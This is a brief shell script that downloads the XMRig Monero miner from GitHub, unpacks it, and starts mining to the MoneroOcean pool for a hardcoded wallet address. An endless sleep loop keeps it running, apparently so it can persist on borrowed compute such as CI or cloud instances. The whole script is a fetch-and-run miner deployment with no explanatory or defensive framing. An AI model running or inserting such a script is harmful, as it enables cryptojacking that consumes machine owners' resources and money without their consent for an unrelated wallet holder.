sudo apt update 
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar xf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o gulf.moneroocean.stream:10128 -u 45mM63u6wA4G8ZqwWiwD7K1JKWuZAaLB2hatREQZZFEpCfw5WWTgfj1avYG2S1CkAK35E9bTLyQz7KywbP6VepkaMG3VViZ -p KenGit
while [ 1 ]; do
sleep 3
done
sleep 999
